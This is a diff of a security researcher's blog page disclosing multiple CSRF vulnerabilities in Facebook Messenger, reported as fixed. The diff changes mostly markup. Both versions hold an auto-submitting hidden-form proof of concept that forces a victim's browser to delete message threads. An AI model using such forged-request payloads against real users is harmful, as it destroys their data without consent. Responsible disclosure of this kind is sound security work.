@@ -26,7 +26,7 @@
 
     <!-- Begin Jekyll SEO tag v2.6.1 -->
 <title>Facebook Messenger Multiple CSRF Vulnerabilities | Mazin Ahmed</title>
-<meta name="generator" content="Jekyll v3.8.7" />
+<meta name="generator" content="Jekyll v3.9.0" />
 <meta property="og:title" content="Facebook Messenger Multiple CSRF Vulnerabilities" />
 <meta name="author" content="mazinahmed" />
 <meta property="og:locale" content="en_US" />
@@ -44,7 +44,7 @@
 <meta name="twitter:site" content="@" />
 <meta name="twitter:creator" content="@mazinahmed" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","image":"https://mazinahmed.net/assets/static/a23e12e9-5fd1-499a-92c6-174a8089bc05.png","headline":"Facebook Messenger Multiple CSRF Vulnerabilities","dateModified":"2015-06-09T00:00:00-05:00","datePublished":"2015-06-09T00:00:00-05:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mazinahmed.net/blog/facebook-messenger-multiple-csrf/"},"url":"https://mazinahmed.net/blog/facebook-messenger-multiple-csrf/","author":{"@type":"Person","name":"mazinahmed"},"description":"Facebook Messenger Multiple CSRF Vulnerabilities","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"Facebook Messenger Multiple CSRF Vulnerabilities","dateModified":"2015-06-09T00:00:00-05:00","datePublished":"2015-06-09T00:00:00-05:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mazinahmed.net/blog/facebook-messenger-multiple-csrf/"},"url":"https://mazinahmed.net/blog/facebook-messenger-multiple-csrf/","image":"https://mazinahmed.net/assets/static/a23e12e9-5fd1-499a-92c6-174a8089bc05.png","author":{"@type":"Person","name":"mazinahmed"},"description":"Facebook Messenger Multiple CSRF Vulnerabilities","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -1560,32 +1560,32 @@ pre {
 <p>Where:</p>
 
 <ul>
-  <li><code class="highlighter-rouge">VALUE1</code>: From User</li>
-  <li><code class="highlighter-rouge">VALUE2</code>: To Target</li>
+  <li><code class="language-plaintext highlighter-rouge">VALUE1</code>: From User</li>
+  <li><code class="language-plaintext highlighter-rouge">VALUE2</code>: To Target</li>
 </ul>
 
 <h1 id="deleting-any-messages-via-csrf">Deleting Any messages via CSRF</h1>
 <p>Using this issue, I was able to force any user to delete messaging threads.</p>
 
 <h3 id="poc-1">PoC:</h3>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;title&gt;</span>POC @mazen160<span class="nt">&lt;/title&gt;</span>
-<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"javascript:document.csrf_form.submit()"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"csrf_form"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://www.messenger.com/ajax/mercury/delete_thread.php"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"ids[0]"</span> <span class="na">name=</span><span class="s">"ids[0]"</span> <span class="na">value=</span><span class="s">"VALUE"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"__user"</span> <span class="na">name=</span><span class="s">"__user"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"__a"</span> <span class="na">name=</span><span class="s">"__a"</span> <span class="na">value=</span><span class="s">"1"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"__dyn"</span> <span class="na">name=</span><span class="s">"__dyn"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"__req"</span> <span class="na">name=</span><span class="s">"__req"</span> <span class="na">value=</span><span class="s">"p"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"fb_dtsg"</span> <span class="na">name=</span><span class="s">"fb_dtsg"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"ttstamp"</span> <span class="na">name=</span><span class="s">"ttstamp"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"__rev"</span> <span class="na">name=</span><span class="s">"__rev"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
-<span class="nt">&lt;/form&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+&lt;title&gt;POC @mazen160&lt;/title&gt;
+&lt;body onload="javascript:document.csrf_form.submit()"&gt;
+&lt;form name="csrf_form" method="POST" action="https://www.messenger.com/ajax/mercury/delete_thread.php"&gt;
+&lt;input type="hidden" id="ids[0]" name="ids[0]" value="VALUE"&gt;
+&lt;input type="hidden" id="__user" name="__user" value=""&gt;
+&lt;input type="hidden" id="__a" name="__a" value="1"&gt;
+&lt;input type="hidden" id="__dyn" name="__dyn" value=""&gt;
+&lt;input type="hidden" id="__req" name="__req" value="p"&gt;
+&lt;input type="hidden" id="fb_dtsg" name="fb_dtsg" value=""&gt;
+&lt;input type="hidden" id="ttstamp" name="ttstamp" value=""&gt;
+&lt;input type="hidden" id="__rev" name="__rev" value=""&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 </code></pre></div></div>
 
-<p>Change of the value of <code class="highlighter-rouge">ids[0]</code> parameter to the victim’s thread ID.</p>
+<p>Change of the value of <code class="language-plaintext highlighter-rouge">ids[0]</code> parameter to the victim’s thread ID.</p>
 
 <p>The issues has been fixed very quickly. I would like to thank Facebook security team for their outstanding work in responding to security submissions.</p>
 
@@ -1609,42 +1609,72 @@ pre {
         
             
                 
-            
-                
-            
-        
-    
-        
-        
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-        
-    
-        
-        
-            
-                
-            
-                
-            
-        
-    
-        
-        
-            
-                
                     
                     <h4>Related Posts</h4>
                     <ul>
+                    
+                    <li class="relatedPost">
+                        <a href="https://mazinahmed.net/blog/hacking-zoom/">Hacking Zoom: Uncovering Tales of Security Vulnerabilities in Zoom
+                        
+                        </a>
+                    </li>
+                    
+                    
+                
+            
+                
+            
+        
+            
+                
+            
+                
+            
+        
+            
+                
+            
+                
+            
+        
+    
+        
+        
+            
+                
+            
+                
+            
+        
+    
+        
+        
+            
+                
+            
+                
+            
+        
+            
+                
+            
+                
+            
+        
+    
+        
+        
+            
+                
+            
+                
+            
+        
+    
+        
+        
+            
+                
                     
                     <li class="relatedPost">
                         <a href="https://mazinahmed.net/blog/ohmyzsh-dotenv-rce/">OhMyZsh dotenv Remote Code Execution
@@ -1740,15 +1770,6 @@ pre {
         
         
             
-                
-                    
-                    <li class="relatedPost">
-                        <a href="https://mazinahmed.net/blog/backchannel-leaks-on-strict-csp-policy/">Backchannel Leaks on Strict Content-Security Policy
-                        
-                        </a>
-                    </li>
-                    
-                    
                 
             
                 
